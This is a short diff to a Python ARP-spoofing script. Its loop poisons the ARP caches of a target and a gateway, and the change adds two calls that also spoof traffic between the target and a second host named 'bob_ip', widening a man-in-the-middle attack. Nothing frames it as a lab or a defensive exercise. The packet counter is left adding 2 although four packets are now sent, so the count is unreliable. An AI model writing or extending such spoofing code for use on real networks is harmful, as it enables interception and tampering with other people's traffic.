@@ -32,6 +32,9 @@ try:
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
+        spoof(target_ip, bob_ip)
+        spoof(bob_ip, target_ip)
+        
         sent_packets_count += 2
         print(f"\r[*] Packets Sent: {sent_packets_count}", end="")
         time.sleep(2)  # Waits for two seconds
